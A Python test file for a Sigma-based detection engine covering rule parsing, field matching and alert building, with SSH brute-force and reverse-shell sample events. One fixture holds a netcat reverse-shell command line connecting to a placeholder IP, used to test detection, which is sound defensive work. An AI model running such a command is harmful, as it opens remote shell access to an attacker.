"\"\"\"Tests for Phase 3 detection engine (sigma parser + evaluator + builder).\"\"\""
import os
os.environ.setdefault("NACOS_SERVER", "")
os.environ.setdefault("API_SECRET_KEY", "test-secret-key-12345678")
os.environ.setdefault("STORE_BACKEND", "memory")
os.environ.setdefault("PG_HOST", "192.168.80.101")
os.environ.setdefault("ES_HOSTS", "http://192.168.80.101:9200")
os.environ.setdefault("REDIS_HOST", "192.168.80.101")

import pytest

from src.detection.sigma import (
    parse_sigma_dict, parse_sigma_yaml, matches,
    Operator, RuleLevel,
)
from src.detection.builder import build_alert
from src.detection.detector import Detector


SAMPLE_SSH_FAIL = {
    "RuleName": "sshd",
    "Status": "Failed password for invalid user admin from 203.0.113.5",
    "ip": "203.0.113.5",
    "hostname": "web-01",
    "agent": {"id": "agent-7", "ip": "10.0.0.5", "name": "web-01"},
    "timestamp": "2026-07-26T12:00:00Z",
}


SAMPLE_REVERSE_SHELL = {
    "process": {"name": "nc", "cmdline": "nc -e /bin/sh 1.2.3.4 4444", "pid": 1234},
    "hostname": "db-01",
    "user": {"name": "www-data"},
    "timestamp": "2026-07-26T13:00:00Z",
}


RULE_SSH = parse_sigma_dict({
    "title": "SSH brute force",
    "id": "ssh-test-001",
    "level": "high",
    "logsource": {"product": "linux", "service": "sshd"},
    "detection": {
        "selection": {
            "RuleName|contains": "ssh",
            "Status|contains": "failed",
            "ip|exists": True,
        },
        "condition": "selection",
    },
    "fields": ["ip", "hostname", "agent.id"],
    "tags": ["attack.credential_access", "attack.t1110"],
})


RULE_REVSHELL = parse_sigma_dict({
    "title": "Reverse shell",
    "id": "revshell-test-001",
    "level": "critical",
    "logsource": {"product": "linux", "category": "process_creation"},
    "detection": {
        "selection": {
            "process.name": "nc",
            "process.cmdline|contains": "-e",
        },
        "condition": "selection",
    },
    "fields": ["process.cmdline", "process.pid", "hostname"],
    "tags": ["attack.execution", "attack.t1059.004"],
})


class TestSigmaParser:
    def test_parse_basic_yaml(self):
        rule = parse_sigma_dict({
            "title": "test",
            "id": "test-1",
            "level": "high",
            "logsource": {"product": "linux"},
            "detection": {
                "selection": {"field|gte": 5},
                "condition": "selection",
            },
        })
        assert rule.title == "test"
        assert rule.level == RuleLevel.HIGH
        assert rule.product == "linux"
        assert rule.selection[0].field == "field"
        assert rule.selection[0].op == Operator.GTE
        assert rule.selection[0].value == 5

    def test_unsupported_condition_rejected(self):
        with pytest.raises(ValueError) as exc:
            parse_sigma_dict({
                "title": "x",
                "id": "x",
                "detection": {
                    "selection": {"a": 1},
                    "condition": "aggregation",
                },
            })
        assert "unsupported Sigma condition" in str(exc.value)

    def test_load_yml_file(self):
        rule = parse_sigma_yaml("src/detection/rules/ssh_brute_force.yml")
        assert rule.title == "SSH brute force attempt"
        assert rule.rule_id == "ssh-brute-force-2026"
        assert rule.product == "linux"
        assert rule.service == "sshd"
        assert len(rule.selection) == 3

    def test_load_all_three_rules(self):
        d = Detector()
        n = d.load_builtin_rules()
        assert n == 3
        rules = d.list_rules()
        ids = {r.rule_id for r in rules}
        assert "ssh-brute-force-2026" in ids
        assert "priv-esc-su-2026" in ids
        assert "reverse-shell-netcat-2026" in ids

    def test_mitre_extraction_from_tags(self):
        from src.detection.builder import _extract_mitre
        result = _extract_mitre(["attack.t1059.004", "attack.credential_access", "not_mitre"])
        assert result == ["T1059.004"]


class TestEvaluator:
    def test_simple_eq_match(self):
        rule = parse_sigma_dict({
            "title": "eq", "id": "t1", "level": "low",
            "detection": {
                "selection": {"status": "failed"},
                "condition": "selection",
            },
        })
        is_match, matched = matches(rule, {"status": "failed"})
        assert is_match
        assert matched["status"] == "failed"

    def test_eq_no_match(self):
        rule = parse_sigma_dict({
            "title": "eq", "id": "t2", "level": "low",
            "detection": {
                "selection": {"status": "failed"},
                "condition": "selection",
            },
        })
        is_match, _ = matches(rule, {"status": "success"})
        assert not is_match

    def test_gte_numeric(self):
        rule = parse_sigma_dict({
            "title": "gte", "id": "t3", "level": "low",
            "detection": {
                "selection": {"level|gte": 10},
                "condition": "selection",
            },
        })
        assert matches(rule, {"level": 12})[0]
        assert not matches(rule, {"level": 9})[0]
        assert matches(rule, {"level": "10"})[0]
        assert not matches(rule, {"level": "9"})[0]

    def test_contains_substring(self):
        rule = parse_sigma_dict({
            "title": "contains", "id": "t4", "level": "low",
            "detection": {
                "selection": {"msg|contains": "failed"},
                "condition": "selection",
            },
        })
        assert matches(rule, {"msg": "Failed password for root"})[0]
        assert not matches(rule, {"msg": "Accepted publickey"})[0]

    def test_dotted_path(self):
        rule = parse_sigma_dict({
            "title": "dotted", "id": "t5", "level": "low",
            "detection": {
                "selection": {"process.cmdline|contains": "nc"},
                "condition": "selection",
            },
        })
        assert matches(rule, SAMPLE_REVERSE_SHELL)[0]

    def test_logsource_filter(self):
        rule = parse_sigma_dict({
            "title": "ls", "id": "t6", "level": "low",
            "logsource": {"product": "linux", "service": "sshd"},
            "detection": {
                "selection": {"x": 1},
                "condition": "selection",
            },
        })
        event = {"logsource": {"product": "linux", "service": "cron"}, "x": 1}
        assert not matches(rule, event)[0]
        event2 = {"logsource": {"product": "linux", "service": "sshd"}, "x": 1}
        assert matches(rule, event2)[0]


class TestBuilder:
    def test_build_alert_for_ssh_rule(self):
        alert = build_alert(RULE_SSH, SAMPLE_SSH_FAIL, "evt-1")
        assert alert is not None
        assert alert.severity.value == "high"
        assert "203.0.113.5" in alert.iocs.ips
        assert alert.hostname == "web-01"
        assert alert.mitre_attack == ["T1110"]
        again = build_alert(RULE_SSH, SAMPLE_SSH_FAIL, "evt-1")
        assert again.alert_id == alert.alert_id

    def test_build_alert_for_revshell(self):
        alert = build_alert(RULE_REVSHELL, SAMPLE_REVERSE_SHELL, "evt-2")
        assert alert is not None
        assert alert.severity.value == "critical"
        assert alert.mitre_attack == ["T1059.004"]

    def test_no_match_returns_none(self):
        event = {"RuleName": "kernel", "Status": "running", "ip": "1.2.3.4"}
        alert = build_alert(RULE_SSH, event, "evt-no")
        assert alert is None

    def test_different_event_id_different_alert_id(self):
        a1 = build_alert(RULE_SSH, SAMPLE_SSH_FAIL, "evt-A")
        a2 = build_alert(RULE_SSH, SAMPLE_SSH_FAIL, "evt-B")
        assert a1.alert_id != a2.alert_id
